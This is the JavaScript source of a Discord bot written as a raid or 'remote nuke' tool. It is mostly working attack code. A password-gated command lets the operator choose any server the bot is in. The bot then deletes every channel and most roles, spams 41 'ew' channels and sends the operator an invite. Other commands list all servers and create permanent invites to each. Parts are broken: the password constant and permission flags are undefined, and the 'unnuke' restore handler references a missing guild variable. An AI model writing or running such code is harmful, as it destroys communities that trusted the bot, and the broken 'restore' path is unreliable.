const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// READY
client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// MESSAGE EVENTS
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  if (content === '!fb') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('🔴 REMOTE NUKE')
      .setDescription('Enter password, then choose server.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  if (content === '!servers') {
    const guilds = client.guilds.cache;
    let text = `**Servers (${guilds.size}):**\n\n`;
    guilds.forEach(g => text += `**${g.name}** (ID: \`${g.id}\`) - ${g.memberCount} members\n`);
    message.reply(text.length > 2000 ? 'List too long. Check console.' : text);
    return;
  }

  if (content === '!invite') {
    let text = '**Server Invites:**\n\n';
    for (const guild of client.guilds.cache.values()) {
      try {
        const invite = await guild.channels.cache.filter(c => c.type === 0).first()?.createInvite({ maxAge: 0 }) || 'No permission';
        text += `**${guild.name}** → https://discord.gg/${invite.code}\n`;
      } catch (e) {
        text += `**${guild.name}** → No permission\n`;
      }
    }
    message.reply(text);
    return;
  }

  if (content === '!unnuke') {
    const embed = new EmbedBuilder().setColor('#00ff00').setTitle('🛠️ !UNNUKE').setDescription('Restores the nuked server.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`unnuke_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Success));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }
});

// INTERACTIONS
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });

    if (interaction.isButton() && interaction.customId.startsWith('fb_start_')) {
      const modal = new ModalBuilder().setCustomId(`fb_modal_${userId}`).setTitle('Enter Password');
      modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)));
      await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId.startsWith('fb_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });

      const servers = client.guilds.cache.map(g => ({
        label: g.name.length > 25 ? g.name.slice(0, 22) + '...' : g.name,
        value: g.id,
        description: `${g.memberCount} members`
      }));

      const menu = new StringSelectMenuBuilder().setCustomId(`fb_server_${userId}`).setPlaceholder('Choose server to NUKE').addOptions(servers);
      const row = new ActionRowBuilder().addComponents(menu);

      await interaction.reply({ content: '✅ Password correct! Select server:', components: [row], ephemeral: true });
    }

    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fb_server_')) {
      await interaction.deferUpdate();

      const guildId = interaction.values[0];
      const guild = client.guilds.cache.get(guildId);

      if (!guild) return interaction.followUp({ content: '❌ Server not found.', ephemeral: true });

      const user = interaction.user;

      await interaction.followUp({ content: `🔴 **RAIDING ${guild.name}** - Deleting everything...`, ephemeral: true });

      try {
        for (const channel of guild.channels.cache.values()) await channel.delete().catch(() => {});
        for (const role of guild.roles.cache.values()) {
          if (role.name === '@everyone' || role.name === 'Owner') continue;
          await role.delete().catch(() => {});
        }

        const ew = await guild.channels.create({ name: 'ew', type: ChannelType.GuildText });
        for (let i = 0; i < 40; i++) {
          await guild.channels.create({ name: 'ew', type: ChannelType.GuildText }).catch(() => {});
        }

        const invite = await ew.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
        if (invite) await user.send(`✅ Raid finished!\nInvite: https://discord.gg/${invite.code}`);

        await interaction.followUp({ content: `✅ **${guild.name}** nuked! Check your DMs.`, ephemeral: true });
      } catch (err) {
        console.error(err);
        await interaction.followUp({ content: '⚠️ Raid partially failed.', ephemeral: true });
      }
    }

    // === !unnuke Handler ===
    if (interaction.customId.startsWith('unnuke_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });

      await interaction.reply({ content: '🛠️ **Restoring the server...**', ephemeral: true });

      // Restore channels and roles
      await guild.channels.create({ name: 'welcome', type: ChannelType.GuildText });
      await guild.channels.create({ name: 'rules', type: ChannelType.GuildText });
      await guild.roles.create({ name: 'Owner', color: '#ffd700', permissions: [PermissionFlagsBits.Administrator] });

      await interaction.followUp({ content: '✅ **Server restored successfully!**', ephemeral: true });
    }
  } catch (error) {
    console.error(error);
  }
});

client.login(TOKEN);
